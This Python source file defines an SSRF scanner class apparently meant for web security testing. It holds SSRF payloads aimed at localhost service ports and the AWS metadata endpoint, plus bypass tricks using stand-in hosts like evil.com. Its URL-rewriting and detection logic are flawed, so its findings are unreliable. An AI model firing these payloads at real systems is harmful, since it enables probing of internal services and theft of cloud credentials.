import requests
import logging
from urllib.parse import urljoin, urlparse

class SSRFScanner:
    """Scanner to detect SSRF vulnerabilities."""

    def __init__(self, driver=None):  # Accept driver as an optional argument
        """Initialize the SSRFScanner with a Selenium WebDriver."""
        self.driver = driver
        self.payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254",  # AWS metadata
            "http://[::1]",  # IPv6 localhost
            "http://example.com@127.0.0.1",  # Bypass techniques
            "http://127.0.0.1:80",  # Port-specific
            "http://evil.com@localhost",  # DNS rebinding
            "http://127.0.0.1#evil.com",  # Fragment bypass
        ]
        self.payloads += [
            "http://127.0.0.1:22",  # Test SSH port
            "http://127.0.0.1:3306",  # Test MySQL port
            "http://127.0.0.1:6379",  # Test Redis port
            "http://127.0.0.1:8080",  # Test common web server port
            "http://[::1]:80",  # IPv6 localhost with port
            "http://oob.example.com/test",  # OOB with a specific endpoint
        ]
        self.oob_server = "http://oob.example.com"  # Out-of-band detection server
        self.log_file = "ssrf_vulnerabilities.log"  # Log file for detected vulnerabilities
        logging.basicConfig(filename=self.log_file, level=logging.INFO)

    def test_ssrf(self, url, form=None):
        """
        Test a URL or form for SSRF vulnerabilities.
        
        Args:
            url (str): The target URL to test.
            form (dict, optional): Form details if testing a form submission.

        Returns:
            bool: True if SSRF vulnerability is detected, False otherwise.
        """
        if not self._is_valid_url(url):
            logging.error(f"Invalid URL: {url}")
            return False

        try:
            logging.info(f"Testing SSRF on {url}")
            for payload in self.payloads + [self.oob_server]:
                if form:
                    # Test SSRF in form action or input fields
                    action_url = urljoin(url, form.get("action", ""))
                    for input_field in form.get("inputs", []):
                        if input_field["type"] == "url":
                            test_url = action_url.replace(input_field["value"], payload)
                            response = requests.get(test_url, timeout=10)  # Increased timeout
                            if self._is_ssrf_successful(response):
                                logging.warning(f"SSRF vulnerability detected at {test_url}")
                                return True
                else:
                    # Test SSRF in the URL directly
                    test_url = url.replace(urlparse(url).netloc, payload)
                    response = requests.get(test_url, timeout=10)  # Increased timeout
                    if self._is_ssrf_successful(response):
                        logging.warning(f"SSRF vulnerability detected at {test_url}")
                        return True
        except requests.RequestException as e:
            logging.error(f"Error testing SSRF on {url}: {e}")
        return False

    def _is_ssrf_successful(self, response):
        """
        Enhanced detection for SSRF attacks.

        Args:
            response (requests.Response): The HTTP response.

        Returns:
            bool: True if SSRF is successful, False otherwise.
        """
        return response.status_code in [200, 301, 302] and (
            "localhost" in response.text.lower() or
            self.oob_server in response.text or
            "metadata" in response.text.lower() or
            "internal" in response.text.lower()
        )

    def _is_valid_url(self, url):
        """
        Validate the given URL.

        Args:
            url (str): The URL to validate.

        Returns:
            bool: True if the URL is valid, False otherwise.
        """
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except ValueError:
            return False
